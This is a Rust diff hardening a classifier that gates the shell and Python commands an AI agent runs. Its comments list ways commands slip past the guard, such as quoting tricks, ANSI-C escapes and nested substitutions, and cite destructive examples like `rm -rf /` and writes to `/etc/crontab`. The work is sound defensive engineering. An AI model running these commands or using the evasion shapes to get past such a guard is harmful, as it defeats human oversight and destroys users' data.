@@ -22,6 +22,7 @@
 use crate::llm::tool_names as tn;
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
+use std::borrow::Cow;
 use std::sync::LazyLock;
 
 /// How dangerous a single bash/python command is, and therefore how the command
@@ -134,6 +135,16 @@ pub struct JudgeInput {
     /// workspace. A *risk signal* the judge weighs, not a verdict on its own,
     /// because out-of-workspace destruction is irreversible.
     pub out_of_workspace: bool,
+    /// True when the Safe fast path actively REFUSED this command rather than
+    /// merely not recognising its head: substitution, a code-injecting
+    /// preamble, a path-qualified head, an out-of-workspace write, an
+    /// executable git config.
+    ///
+    /// The chat lane ignores it, because both outcomes route to the judge
+    /// there. The UNATTENDED coding-agent lane reads it: with nobody to answer
+    /// a card, a shape the guard refused to see through is denied, while an
+    /// unrecognised head (`cargo build`) still runs.
+    pub fast_path_refused: bool,
 }
 
 impl JudgeInput {
@@ -175,18 +186,18 @@ pub(crate) const GUARD_SHELLS: [&str; 6] = ["sh", "bash", "zsh", "dash", "ksh", 
 /// every check. Codex sends commands pre-wrapped, and a chat `run_bash` can be
 /// handed the same shape. Returns the original command when it is not a
 /// recognized shell wrapper.
-pub(crate) fn unwrap_shell_command(command: &str) -> &str {
+pub(crate) fn unwrap_shell_command(command: &str) -> Cow<'_, str> {
     const SHELLS: &[&str] = &GUARD_SHELLS;
     let trimmed = command.trim_start();
     let Some(first) = trimmed.split_whitespace().next() else {
-        return command;
+        return Cow::Borrowed(command);
     };
     // Normalized, not a raw basename. An escaped or quoted head runs the same
     // shell, and leaving it unwrapped hides the payload from every scan that
     // follows. Unwrapping can only ever expose more.
     let base = normalized_head(first);
     if !SHELLS.contains(&base) {
-        return command;
+        return Cow::Borrowed(command);
     }
     // Walk whitespace-delimited tokens (with byte offsets) to find the `-c`-style
     // flag; everything after it is the script. One quote layer is stripped so the
@@ -214,12 +225,12 @@ pub(crate) fn unwrap_shell_command(command: &str) -> &str {
             // back to the whole command, which the segment split covers end to
             // end. Strictly more scanning, never less.
             if tail_runs_more_commands(tail) {
-                return command;
+                return Cow::Borrowed(command);
             }
             return script;
         }
     }
-    command
+    Cow::Borrowed(command)
 }
 
 /// A single-dash cluster of shell option letters that includes `c`: `-c`, `-lc`,
@@ -240,31 +251,182 @@ fn is_shell_c_flag(tok: &str) -> bool {
     }
 }
 
-/// Take the script operand that follows a shell `-c` flag.
+/// Take the script operand that follows a shell `-c` flag, as POSIX builds it.
 ///
 /// In `sh -c <script> [$0 [arg ...]]` the script is ONE word, and anything
-/// after it sets `$0` and the positional parameters. So the close quote is not
-/// necessarily the last character. Cut at the matching close quote, rather
-/// than only unwrapping quotes that surround the whole remainder. That keeps
-/// the form from presenting a quoted head token and slipping past every
-/// head-token scan.
+/// after it sets `$0` and the positional parameters. A word is built by
+/// JOINING adjacent quoted and unquoted runs, so the first close quote is not
+/// where the word ends. `'rm -rf '\''/'\'''` is one word reading `rm -rf '/'`,
+/// and cutting at that first close quote handed every scan the truncated
+/// prefix `rm -rf ` instead. That idiom is exactly what Codex emits.
 ///
-/// An unquoted or unterminated operand is returned as-is. There is no full
-/// shell parser here, and the classifiers downstream must stay conservative.
+/// One quoting layer is decoded, which is what the inner shell sees: `-c`
+/// makes it re-parse the operand, so a quote the outer shell escaped arrives
+/// as a literal quote the inner shell then acts on.
+///
+/// An operand that does not START with a quote is returned whole, tail
+/// included. Cutting it at the first space would be POSIX-exact and would scan
+/// LESS, and every classifier downstream is conservative by design.
 ///
 /// Returns the script and the TAIL after it, because the caller has to decide
 /// whether that tail is discardable (see [`tail_runs_more_commands`]).
-fn split_shell_script_operand(s: &str) -> (&str, &str) {
+fn split_shell_script_operand(s: &str) -> (Cow<'_, str>, &str) {
     let b = s.as_bytes();
-    if b.len() >= 2 && (b[0] == b'\'' || b[0] == b'"') {
-        let quote = b[0] as char;
-        // `find` returns a byte offset relative to `s[1..]`, and both it and the
-        // opening quote are ASCII, so these are real char boundaries.
-        if let Some(end) = s[1..].find(quote) {
-            return (&s[1..1 + end], &s[1 + end + 1..]);
+    let opens_quoted = !b.is_empty() && (b[0] == b'\'' || b[0] == b'"' || opens_ansi_c_run(b, 0));
+    if !opens_quoted {
+        return (Cow::Borrowed(s), "");
+    }
+    let mut word = String::new();
+    let mut i = 0;
+    while i < b.len() {
+        match b[i] {
+            // A single-quoted run is literal end to end, escapes included.
+            b'\'' => {
+                let start = i + 1;
+                let end = s[start..].find('\'').map_or(s.len(), |o| start + o);
+                word.push_str(&s[start..end]);
+                i = (end + 1).min(s.len());
+            }
+            // A double-quoted run keeps its content, and a backslash there
+            // escapes only these four characters.
+            b'"' => {
+                i += 1;
+                while i < b.len() && b[i] != b'"' {
+                    if b[i] == b'\\' && matches!(b.get(i + 1), Some(b'"' | b'\\' | b'$' | b'`')) {
+                        word.push(b[i + 1] as char);
+                        i += 2;
+                        continue;
+                    }
+                    i += push_char_at(&mut word, s, i);
+                }
+                i = (i + 1).min(s.len());
+            }
+            // ANSI-C quoting. Bash decodes these escapes BEFORE the word
+            // reaches `-c`, so copying them verbatim loses the separator they
+            // stand for: `bash -c 'echo hi'$'\x3b'"rm -rf /"` runs the `rm`.
+            _ if opens_ansi_c_run(b, i) => {
+                i = push_ansi_c_run(&mut word, s, i + 1);
+            }
+            b'\\' => {
+                i += 1;
+                if i < b.len() {
+                    i += push_char_at(&mut word, s, i);
+                }
+            }
+            // A substitution glued to the word is part of the word in POSIX.
+            // Modelling that is the segment scans' job, not this one. End the
+            // word here so the opener lands in the TAIL, where
+            // `tail_runs_more_commands` sees it and hands back the whole
+            // command. Otherwise the `$` is pushed into the script and the
+            // tail starts at `(`, which nothing recognises: the substitution
+            // in `bash -c 'echo hi'$(rm -rf /)` disappeared entirely.
+            _ if opens_substitution(b, i) => break,
+            c if ends_shell_word(c) => break,
+            _ => i += push_char_at(&mut word, s, i),
         }
     }
-    (s, "")
+    (Cow::Owned(word), &s[i..])
+}
+
+/// True when a substitution opener starts at byte `i`: `$(`, `<(`, `>(`, or a
+/// backtick. Quoting is the CALLER's business, since the callers disagree
+/// about which quoting suppresses it.
+fn opens_substitution(b: &[u8], i: usize) -> bool {
+    b[i] == b'`' || (matches!(b[i], b'$' | b'<' | b'>') && b.get(i + 1) == Some(&b'('))
+}
+
+/// True when an ANSI-C `$'…'` run opens at byte `i`.
+fn opens_ansi_c_run(b: &[u8], i: usize) -> bool {
+    b[i] == b'$' && b.get(i + 1) == Some(&b'\'')
+}
+
+/// Append the decoded body of an ANSI-C `$'…'` run whose opening quote is at
+/// `open`, and return the index just past its closing quote. An unterminated
+/// run is read to the end of input.
+fn push_ansi_c_run(word: &mut String, s: &str, open: usize) -> usize {
+    let b = s.as_bytes();
+    let mut i = open + 1;
+    while i < b.len() {
+        match b[i] {
+            b'\'' => return i + 1,
+            b'\\' if i + 1 < b.len() => {
+                let (text, next) = decode_ansi_c_escape(s, i + 1);
+                word.push_str(&text);
+                i = next;
+            }
+            _ => i += push_char_at(word, s, i),
+        }
+    }
+    i
+}
+
+/// Decode one ANSI-C escape whose body starts at `at`, just past the
+/// backslash. Returns the text it stands for and the index after it. An
+/// unrecognised escape keeps its backslash, which is what bash does.
+fn decode_ansi_c_escape(s: &str, at: usize) -> (String, usize) {
+    let one = |c: char| (c.to_string(), at + 1);
+    match s.as_bytes()[at] {
+        b'a' => one('\u{7}'),
+        b'b' => one('\u{8}'),
+        b'e' | b'E' => one('\u{1b}'),
+        b'f' => one('\u{c}'),
+        b'n' => one('\n'),
+        b'r' => one('\r'),
+        b't' => one('\t'),
+        b'v' => one('\u{b}'),
+        b'\\' => one('\\'),
+        b'\'' => one('\''),
+        b'"' => one('"'),
+        b'?' => one('?'),
+        b'x' => radix_escape(s, at + 1, 16, 2, "x"),
+        b'u' => radix_escape(s, at + 1, 16, 4, "u"),
+        b'U' => radix_escape(s, at + 1, 16, 8, "U"),
+        b'0'..=b'7' => radix_escape(s, at, 8, 3, ""),
+        _ => {
+            let mut text = String::from('\\');
+            let len = push_char_at(&mut text, s, at);
+            (text, at + len)
+        }
+    }
+}
+
+/// Decode up to `max` digits of `radix` starting at `at`, the shape behind
+/// `\xHH`, `\uHHHH` and `\nnn`. With no digit at all the escape is literal
+/// text, so the backslash and `prefix` are returned unchanged.
+fn radix_escape(s: &str, at: usize, radix: u32, max: usize, prefix: &str) -> (String, usize) {
+    let b = s.as_bytes();
+    let end = (at + max).min(b.len());
+    let digits = (at..end)
+        .take_while(|&i| (b[i] as char).is_digit(radix))
+        .count();
+    if digits == 0 {
+        return (format!("\\{prefix}"), at);
+    }
+    let value = u32::from_str_radix(&s[at..at + digits], radix).unwrap_or(0);
+    let ch = char::from_u32(value).unwrap_or(char::REPLACEMENT_CHARACTER);
+    (ch.to_string(), at + digits)
+}
+
+/// Push the whole character starting at byte `at` onto `word` and return its
+/// byte length, so the caller's index stays on a char boundary.
+fn push_char_at(word: &mut String, s: &str, at: usize) -> usize {
+    match s[at..].chars().next() {
+        Some(ch) => {
+            word.push(ch);
+            ch.len_utf8()
+        }
+        None => 1,
+    }
+}
+
+/// True for a byte that ends an UNQUOTED shell word: whitespace, or a control
+/// operator.
+///
+/// The operator half is load-bearing. A `;` right after a quoted run belongs
+/// to the OUTER shell. Gluing it onto the script would hide the command after
+/// it from [`tail_runs_more_commands`].
+fn ends_shell_word(c: u8) -> bool {
+    c.is_ascii_whitespace() || matches!(c, b';' | b'|' | b'&' | b'<' | b'>' | b'(' | b')')
 }
 
 /// True when the tail after a `-c` script operand can run something rather than
@@ -309,25 +471,30 @@ pub fn static_classify(tool_name: &str, input: &Value) -> StaticVerdict {
     // each segment's head token and does not descend into the payload. Without
     // this, a wrapped command reads as head `bash`, skips the catastrophic
     // hard-block, and with the judge off falls through to Safe.
-    let cmd = unwrap_shell_command(raw);
+    let unwrapped = unwrap_shell_command(raw);
+    let cmd = unwrapped.as_ref();
     if catastrophic_reason(cmd).is_some() {
         return StaticVerdict::Settled(RiskLane::Catastrophic);
     }
     let is_bash = matches!(tool_name, tn::RUN_BASH | tn::RUN_BASH_BACKGROUND);
-    let statically_safe = if is_bash {
-        bash_is_statically_safe(cmd)
+    // Python declines are all ACTIVE signals (subprocess, eval, a network
+    // write, a destruction call), never an unlisted-head omission, so the
+    // whole set is a refusal.
+    let declined = if is_bash {
+        bash_fast_path(cmd)
     } else {
-        python_is_statically_safe(cmd)
+        (!python_is_statically_safe(cmd)).then_some(FastPathDecline::Refusal)
     };
-    if statically_safe {
+    let Some(declined) = declined else {
         return StaticVerdict::Settled(RiskLane::Safe);
-    }
+    };
     StaticVerdict::NeedsJudge(JudgeInput {
         tool_name: tool_name.to_string(),
         command: cmd.to_string(),
         // The out-of-workspace marker is a bash-only path heuristic; Python code
         // is handed to the judge verbatim, which reads any paths from the code.
         out_of_workspace: is_bash && command_escapes_workspace(cmd),
+        fast_path_refused: declined == FastPathDecline::Refusal,
     })
 }
 
@@ -408,14 +575,37 @@ static DESTRUCTIVE_DEST_HEADS: &[&str] = &["mv", "cp"];
 /// in-workspace (one un-checkpointable segment poisons the line), `None` when
 /// no segment has a destruction shape.
 fn bash_destruction_scope(command: &str) -> Option<DestructionScope> {
+    bash_destruction_scope_at(command, 0)
+}
+
+/// [`bash_destruction_scope`], carrying the substitution-recursion depth. A
+/// substitution body is scanned like a segment, for the reason
+/// [`substitution_bodies`] gives: without it `ls $(rm -rf ~)` resolves to head
+/// `ls`, finds no destruction, and the fallback settles it Safe.
+fn bash_destruction_scope_at(command: &str, depth: usize) -> Option<DestructionScope> {
+    /// True when `scope` escapes the workspace; records an in-workspace hit.
+    fn escapes(scope: Option<DestructionScope>, found_in_ws: &mut bool) -> bool {
+        match scope {
+            Some(DestructionScope::OutOfWorkspace) => true,
+            Some(DestructionScope::InWorkspace) => {
+                *found_in_ws = true;
+                false
+            }
+            None => false,
+        }
+    }
     let mut found_in_ws = false;
     for segment in command_segments(command) {
-        match segment_destruction_scope(&segment) {
-            Some(DestructionScope::OutOfWorkspace) => {
-                return Some(DestructionScope::OutOfWorkspace)
+        if escapes(segment_destruction_scope(&segment), &mut found_in_ws) {
+            return Some(DestructionScope::OutOfWorkspace);
+        }
+    }
+    if depth < MAX_SUBSTITUTION_DEPTH {
+        for body in substitution_bodies(command) {
+            let scope = bash_destruction_scope_at(body, depth + 1);
+            if escapes(scope, &mut found_in_ws) {
+                return Some(DestructionScope::OutOfWorkspace);
             }
-            Some(DestructionScope::InWorkspace) => found_in_ws = true,
-            None => {}
         }
     }
     found_in_ws.then_some(DestructionScope::InWorkspace)
@@ -618,7 +808,7 @@ pub fn command_text<'a>(tool_name: &str, input: &'a Value) -> Option<&'a str> {
 // ===========================================================================
 
 /// Command heads that read or transform-to-stdout. Output redirects are
-/// validated separately by [`segment_is_safe`].
+/// validated separately by [`segment_safety`].
 ///
 /// Most are safe regardless of their arguments. A handful can be POINTED at an
 /// output path instead of stdout, and those are listed again in
@@ -734,16 +924,23 @@ static READ_ONLY_HEADS: &[&str] = &[
 /// * `uniq [INPUT [OUTPUT]]` and `xxd [INFILE [OUTFILE]]`, where the write is a
 ///   trailing POSITIONAL with no flag to spot
 /// * `yq -i` / `--inplace`, which rewrites its input
+/// * `less -o FILE`, which logs piped input to a named file
 ///
 /// None of those forms carries a `>` for `redirect_targets` to catch, so
 /// without this check `sort -o /etc/crontab data/f` settles `Safe`: no card on
 /// the chat lane, and `RequestVerdict::Benign` (unattended auto-allow) on the
 /// coding-agent lane. They stay on the allowlist because the common form really
 /// is a read, but only while every path they name is inside the workspace.
-/// Falling through to the judge is the fail-safe direction the allowlist is
-/// designed around, so the false positives (`sort /etc/passwd`) cost one LLM
-/// call each.
-static WRITE_CAPABLE_READ_ONLY_HEADS: &[&str] = &["sort", "uniq", "tree", "xxd", "yq", "base64"];
+///
+/// The check is coarse on purpose, and it costs more than it once did. Telling
+/// `sort -o /etc/x data/f` from `sort /etc/passwd` needs per-head flag arity,
+/// which is exactly what listing the heads here avoids. So BOTH are a
+/// [`FastPathDecline::Refusal`]: a judge call on the chat lane, and a DENIAL
+/// on the unattended coding-agent lane, which fails closed on a refusal. To
+/// read outside the workspace unattended, reach for `cat` / `head` / `grep`,
+/// which are plain read-only heads and still settle Safe.
+static WRITE_CAPABLE_READ_ONLY_HEADS: &[&str] =
+    &["sort", "uniq", "tree", "xxd", "yq", "base64", "less"];
 
 /// Command heads that create or extend in-workspace paths — safe when every
 /// path argument stays inside the workspace.
@@ -775,25 +972,66 @@ static GIT_READ_ONLY_SUBCOMMANDS: &[&str] = &[
     "version",
 ];
 
-/// True when every shell segment of `command` is an obviously-safe shape. One
-/// not-safe segment poisons the whole line (a chained `&&`/`|` could smuggle a
-/// dangerous command after a safe one).
-fn bash_is_statically_safe(command: &str) -> bool {
-    command_segments(command).all(|s| segment_is_safe(&s))
+/// Why the Safe fast path did not settle a command. The two are NOT
+/// interchangeable, and two permissive paths separate them: the unattended
+/// coding-agent lane denies a [`FastPathDecline::Refusal`] and still runs a
+/// [`FastPathDecline::Omission`], and [`grant_covers_command`] refuses to let
+/// a stored grant cover a Refusal.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum FastPathDecline {
+    /// The head is not what runs, or not all of it. The allowlist refuses
+    /// these on purpose, and the full set is:
+    ///
+    ///   * command or process substitution,
+    ///   * a code-injecting `VAR=value` preamble,
+    ///   * a path-qualified command head,
+    ///   * a redirect target outside the workspace,
+    ///   * an out-of-workspace path under a head that can WRITE one
+    ///     ([`WRITE_CAPABLE_READ_ONLY_HEADS`], `curl`, `wget`),
+    ///   * a create head pointed outside the workspace,
+    ///   * `git -c` / `--config-env` / `--exec-path`, or a git output flag.
+    ///
+    /// The write-capable entry is the coarse one: the check is a path outside
+    /// the workspace ANYWHERE in the segment, so `sort /etc/passwd` is a
+    /// refusal even though it only reads. Telling the read from the write
+    /// needs per-head flag arity, which is what that list exists to avoid.
+    Refusal,
+    /// The head is simply not on the allowlist. The allowlist header says what
+    /// this costs: a judge call, never safety.
+    Omission,
 }
 
-/// Whether one shell command segment is obviously safe.
-fn segment_is_safe(segment: &str) -> bool {
+/// Why the fast path declined `command`, or `None` when every segment is
+/// obviously safe.
+///
+/// One not-safe segment poisons the whole line, since a chained `&&` or `|`
+/// could smuggle a dangerous command after a safe one. A refusal anywhere
+/// outranks an omission.
+fn bash_fast_path(command: &str) -> Option<FastPathDecline> {
+    let mut declined = None;
+    for segment in command_segments(command) {
+        match segment_safety(&segment) {
+            Some(FastPathDecline::Refusal) => return Some(FastPathDecline::Refusal),
+            Some(FastPathDecline::Omission) => declined = Some(FastPathDecline::Omission),
+            None => {}
+        }
+    }
+    declined
+}
+
+/// Why one shell command segment is not obviously safe, or `None` when it is.
+fn segment_safety(segment: &str) -> Option<FastPathDecline> {
+    use FastPathDecline::{Omission, Refusal};
     // An output redirect to a path outside the workspace is a write outside the
-    // workspace — not safe, even behind a read-only head (`grep x f > /etc/y`).
+    // workspace, not safe even behind a read-only head (`grep x f > /etc/y`).
     // Harmless device sinks (`/dev/null`, std streams) are exempt.
     if redirect_targets(segment).any(|t| !path_in_workspace(t) && !is_harmless_redirect(t)) {
-        return false;
+        return Some(Refusal);
     }
     // Command/process substitution executes an embedded command under whatever
-    // head precedes it — never settle it Safe; the judge sees the full text.
+    // head precedes it. Never settle it Safe; the judge sees the full text.
     if has_command_substitution(segment) {
-        return false;
+        return Some(Refusal);
     }
     let toks: Vec<&str> = segment.split_whitespace().collect();
     let i = command_head_index(&toks);
@@ -808,11 +1046,11 @@ fn segment_is_safe(segment: &str) -> bool {
     // same text is an argument, not an assignment the shell acts on, so
     // `grep NODE_OPTIONS= .env` is an ordinary read.
     if preamble_has_code_injecting_env(&toks, i) {
-        return false;
+        return Some(Refusal);
     }
     let Some(head) = toks.get(i) else {
-        // Only benign prefixes / redirects — no command runs.
-        return true;
+        // Only benign prefixes / redirects, so no command runs.
+        return None;
     };
     // Resolve the head by NAME, never by basename. Resolving a path-qualified
     // head to its basename would settle the agent's OWN binary as the read-only
@@ -823,42 +1061,47 @@ fn segment_is_safe(segment: &str) -> bool {
     // path-qualified head falls through to the judge instead. The DANGER scans
     // keep resolving by basename, because there it can only add a verdict.
     if head.contains('/') {
-        return false;
+        return Some(Refusal);
     }
     let base = *head;
     let args = &toks[i + 1..];
     match base {
-        "git" => git_subcommand_read_only(args),
+        "git" => git_subcommand_safety(args),
         // A GET/download is safe unless it writes its output to a path outside
-        // the workspace (`curl -o /etc/cron.d/evil …`).
-        "curl" | "wget" => !is_mutating_http(args) && !segment_escapes_workspace(segment),
+        // the workspace (`curl -o /etc/cron.d/evil …`). A mutating method is an
+        // ordinary side-effect shape the fallback tags, not an evasion.
+        "curl" | "wget" if segment_escapes_workspace(segment) => Some(Refusal),
+        "curl" | "wget" => is_mutating_http(args).then_some(Omission),
         // Read-only in the ordinary form, but able to write a named file: the
         // same shape as the curl/wget arm above, and it must be tried BEFORE
         // the plain read-only arm below. See [`WRITE_CAPABLE_READ_ONLY_HEADS`].
-        _ if WRITE_CAPABLE_READ_ONLY_HEADS.contains(&base) => !segment_escapes_workspace(segment),
-        _ if READ_ONLY_HEADS.contains(&base) => true,
-        _ if CREATE_HEADS.contains(&base) => args
+        _ if WRITE_CAPABLE_READ_ONLY_HEADS.contains(&base) => {
+            segment_escapes_workspace(segment).then_some(Refusal)
+        }
+        _ if READ_ONLY_HEADS.contains(&base) => None,
+        _ if CREATE_HEADS.contains(&base) => (!args
             .iter()
             .filter(|a| !a.starts_with('-'))
-            .all(|a| path_in_workspace(a)),
-        _ => false,
+            .all(|a| path_in_workspace(a)))
+        .then_some(Refusal),
+        _ => Some(Omission),
     }
 }
 
-/// True when `args`, the tokens after `git`, name a read-only subcommand and
-/// are not pointing it at an output file. Leading global flags are skipped.
+/// Why a `git` call is not obviously safe, or `None` when it is. `args` is the
+/// tokens after `git`; leading global flags are skipped. Safe means a
+/// read-only subcommand that is not pointed at an output file.
 ///
-/// The second half is not redundant. "Read-only" here means "does not mutate
-/// the repository". The whole diff family accepts an output flag, which
+/// The output-flag half is not redundant. "Read-only" here means "does not
+/// mutate the repository". The whole diff family accepts an output flag, which
 /// truncates and rewrites an arbitrary path with no `>` for `redirect_targets`
 /// to see. Such a call would settle `Safe`, with no card on the chat lane and
-/// an unattended auto-allow on the coding-agent one. An output flag anywhere
-/// after the subcommand routes the whole call to the judge.
-fn git_subcommand_read_only(args: &[&str]) -> bool {
+/// an unattended auto-allow on the coding-agent one.
+fn git_subcommand_safety(args: &[&str]) -> Option<FastPathDecline> {
     let mut i = 0;
     while let Some(&arg) = args.get(i) {
         // Global flags that can inject an executable under a read-only
-        // subcommand — never statically safe; let the judge see them.
+        // subcommand. Never statically safe; let the judge see them.
         //   `-c k=v` / `--config-env`: an executable config (pager, editor,
         //     sshCommand, alias).
         //   `--exec-path[=<dir>]`: redirects where git resolves `git-<sub>`.
@@ -868,7 +1111,7 @@ fn git_subcommand_read_only(args: &[&str]) -> bool {
             || arg == "--exec-path"
             || arg.starts_with("--exec-path=")
         {
-            return false;
+            return Some(FastPathDecline::Refusal);
         }
         match arg {
             // Flags that take a separate value argument.
@@ -881,9 +1124,14 @@ fn git_subcommand_read_only(args: &[&str]) -> bool {
         .get(i)
         .is_some_and(|sub| GIT_READ_ONLY_SUBCOMMANDS.contains(sub))
     {
-        return false;
+        // A mutating or unknown subcommand (`push`, `commit`) is an omission,
+        // the same shape as an unrecognised head. It hides nothing.
+        return Some(FastPathDecline::Omission);
     }
-    !args[i + 1..].iter().any(|a| is_git_output_flag(a))
+    args[i + 1..]
+        .iter()
+        .any(|a| is_git_output_flag(a))
+        .then_some(FastPathDecline::Refusal)
 }
 
 /// True when a post-subcommand `git` token names a file the subcommand will
@@ -1068,6 +1316,11 @@ fn redirect_targets(segment: &str) -> impl Iterator<Item = &str> {
 /// NOT caught here — it belongs to the ask/judge lane in a later phase, not the
 /// deterministic hard-block.
 fn catastrophic_reason(command: &str) -> Option<&'static str> {
+    catastrophic_reason_at(command, 0)
+}
+
+/// [`catastrophic_reason`], carrying the substitution-recursion depth.
+fn catastrophic_reason_at(command: &str, depth: usize) -> Option<&'static str> {
     if is_fork_bomb(command) {
         return Some("a fork bomb (a recursive self-spawning process that exhausts the machine)");
     }
@@ -1083,8 +1336,18 @@ fn catastrophic_reason(command: &str) -> Option<&'static str> {
         // reads as `bash` and the payload is never inspected. Prefixing any
         // read-only command would then be enough to walk the hard-block.
         // Unwrapping here can only ADD a catastrophic verdict.
-        if let Some(reason) = catastrophic_rm_or_chmod(unwrap_shell_command(&segment)) {
+        let inner = unwrap_shell_command(&segment);
+        if let Some(reason) = catastrophic_rm_or_chmod(&inner) {
             return Some(reason);
+        }
+    }
+    // A substitution runs its body, and every scan above reads the OUTER head,
+    // so `echo $(rm -rf /)` resolves to `echo`. Classify each body too.
+    if depth < MAX_SUBSTITUTION_DEPTH {
+        for body in substitution_bodies(command) {
+            if let Some(reason) = catastrophic_reason_at(body, depth + 1) {
+                return Some(reason);
+            }
         }
     }
     None
@@ -1203,6 +1466,13 @@ fn catastrophic_rm_or_chmod(segment: &str) -> Option<&'static str> {
 /// scan, and classifies all the way through to Safe.
 fn normalized_head(head: &str) -> &str {
     let stripped = head.trim_start_matches(['(', '{', '\\']);
+    // `$'rm'` (ANSI-C) and `$"rm"` (locale) both run the plain `rm`. The `$`
+    // blocks the quote trim below, so it comes off first. Only before a
+    // quote, so `$HOME` keeps its sigil and stays an unknown word.
+    let stripped = match stripped.strip_prefix('$') {
+        Some(rest) if rest.starts_with('\'') || rest.starts_with('"') => rest,
+        _ => stripped,
+    };
     let unquoted = stripped.trim_matches(|c| c == '"' || c == '\'');
     unquoted.rsplit('/').next().unwrap_or(unquoted)
 }
@@ -1229,7 +1499,7 @@ fn is_flag_token(tok: &str) -> bool {
 /// only ADD a danger verdict. A head that is not flag-shaped never branches, so
 /// it costs nothing on ordinary input.
 ///
-/// Deliberately NOT used by [`segment_is_safe`]. There an unrecognised head
+/// Deliberately NOT used by [`segment_safety`]. There an unrecognised head
 /// already falls through to the judge, so resolving these forms would newly
 /// SETTLE decorated commands as Safe.
 fn danger_head_candidates<'a>(toks: &'a [&'a str]) -> Vec<(String, &'a [&'a str])> {
@@ -1306,7 +1576,7 @@ const CODE_INJECTING_ENV_NAMES: &[&str] = &[
     "GIT_EDITOR",
     // Covers GIT_CONFIG_GLOBAL / _SYSTEM / _COUNT / _KEY_n / _VALUE_n. These are
     // the environment equivalents of `git -c` and `--config-env`, which
-    // `git_subcommand_read_only` already refuses by name as "an executable
+    // `git_subcommand_safety` already refuses by name as "an executable
     // config", and they reach the same place: a config file naming
     // `diff.external` makes a plain `git diff` run it. The same write-then-run
     // path as `PATH=` applies, since writing `data/g` is itself Safe.
@@ -1347,25 +1617,6 @@ fn preamble_has_code_injecting_env(toks: &[&str], head_at: usize) -> bool {
         .take(head_at)
         .copied()
         .any(is_code_injecting_assignment)
-}
-
-/// True when any segment of `command` carries such a preamble.
-///
-/// Shared by the two PERMISSIVE paths so they cannot disagree: the Safe fast
-/// path in [`segment_is_safe`], and the stored-grant path in
-/// `command_permission::command_is_allowed`. A stored grant for a read-only
-/// head would otherwise auto-allow a preamble-injected run with no card, the
-/// same bypass the fast path already refuses.
-///
-/// The danger scans' head walk is deliberately NOT gated on this: there the
-/// assignment must stay invisible so `LD_PRELOAD=x rm -rf /` still reads as an
-/// `rm` and still hard-blocks.
-pub fn command_has_code_injecting_env(command: &str) -> bool {
-    command_segments(command).any(|segment| {
-        let toks: Vec<&str> = segment.split_whitespace().collect();
-        let i = command_head_index(&toks);
-        preamble_has_code_injecting_env(&toks, i)
-    })
 }
 
 /// Command-line tokens that prefix the real command and should be skipped when
@@ -1412,7 +1663,7 @@ fn redirect_token_needs_target(tok: &str) -> Option<bool> {
     Some(after.is_empty())
 }
 
-/// True when a segment contains command or process substitution — constructs
+/// True when a segment contains command or process substitution, constructs
 /// that execute an embedded command (`$(...)`, backticks, `<(...)`, `>(...)`).
 /// Such a segment is never settled Safe regardless of its head (`echo $(rm -rf
 /// /)` would otherwise pass on `echo`); the judge sees the full text instead.
@@ -1421,6 +1672,196 @@ fn has_command_substitution(segment: &str) -> bool {
         || segment.contains('`')
         || segment.contains("<(")
         || segment.contains(">(")
+}
+
+/// How deep the danger scans follow nested substitutions. Two levels is
+/// already exotic, so the cap only exists to bound a pathological string.
+const MAX_SUBSTITUTION_DEPTH: usize = 8;
+
+/// The body of every command or process substitution in `s`: `$(...)`,
+/// backticks, `<(...)` and `>(...)`.
+///
+/// Each body is a command in its own right, and no head-token scan can see it:
+/// `echo $(rm -rf /)` reads as head `echo`. So the danger scans classify each
+/// body on its own merits, the way they already recurse into a `sh -c`
+/// payload. [`has_command_substitution`] only keeps the Safe fast path off
+/// such a segment. The static fallback still read the outer head and landed on
+/// Safe.
+///
+/// An opener inside a SINGLE-quoted run is skipped, since POSIX makes it
+/// literal there. That keeps `grep -rn '$(rm -rf /)' docs` out of the
+/// catastrophic hard block, which has no override. Double quotes are NOT
+/// skipped: `$(` and a backtick both expand inside them.
+///
+/// An opener with no closer yields the rest of the string. An unparseable
+/// substitution is scanned rather than waved through.
+fn substitution_bodies(s: &str) -> Vec<&str> {
+    let b = s.as_bytes();
+    let mut bodies = Vec::new();
+    let mut quotes = QuoteState::default();
+    let mut i = 0;
+    while i < b.len() {
+        if let Some(next) = quotes.step(s, i) {
+            i = next;
+            continue;
+        }
+        match b[i] {
+            b'`' => {
+                let start = i + 1;
+                let end = s[start..].find('`').map_or(s.len(), |o| start + o);
+                bodies.push(&s[start..end]);
+                i = (end + 1).min(s.len());
+            }
+            b'$' | b'<' | b'>' if b.get(i + 1) == Some(&b'(') => {
+                let start = i + 2;
+                let end = matching_close_paren(s, start);
+                bodies.push(&s[start..end]);
+                i = (end + 1).min(s.len());
+            }
+            _ => i += char_len_at(s, i),
+        }
+    }
+    bodies
+}
+
+/// Byte offset of the `)` closing a substitution whose body starts at `start`,
+/// or `s.len()` when it is never closed.
+///
+/// Nesting-aware, so `$(echo $(rm -rf /))` yields the outer body whole. Also
+/// QUOTE-aware, because a parenthesis inside quotes is ordinary text.
+/// `echo "$(printf ')' ; rm -rf /)"` would otherwise end the body at the
+/// quoted `)` and hand the scans `printf '` alone.
+fn matching_close_paren(s: &str, start: usize) -> usize {
+    let b = s.as_bytes();
+    let mut depth = 1usize;
+    let mut quotes = QuoteState::default();
+    let mut i = start;
+    while i < b.len() {
+        if let Some(next) = quotes.step_all_quotes(s, i) {
+            i = next;
+            continue;
+        }
+        match b[i] {
+            b'(' => depth += 1,
+            b')' => {
+                depth -= 1;
+                if depth == 0 {
+                    return i;
+                }
+            }
+            _ => {}
+        }
+        i += char_len_at(s, i);
+    }
+    s.len()
+}
+
+/// POSIX quoting state for a byte walk over a command. Three runs, because
+/// they differ on the two questions the scanners ask:
+///
+/// | run | expands `$(` | backslash escapes |
+/// |---|---|---|
+/// | `'…'` | no | no |
+/// | `$'…'` (ANSI-C) | no | YES |
+/// | `"…"` | YES | yes |
+///
+/// Collapsing any pair loses a real command. Tracking single quotes alone
+/// reads `echo "'$(rm -rf /)'"` as quoted. Reading `$'…'` as a plain
+/// single-quoted run inverts the state from its first `\'` onward, so
+/// `echo $'\'' $(rm -rf /)` looks quoted to the end of the line.
+#[derive(Default)]
+struct QuoteState {
+    in_single: bool,
+    in_double: bool,
+    in_ansi_c: bool,
+}
+
+impl QuoteState {
+    /// Advance past the byte at `i` when it is quoting syntax, an escaped
+    /// character, or content inside a run where no substitution expands.
+    /// `Some(next_index)` means the caller must not read this byte. `None`
+    /// means it is live shell syntax the caller owns.
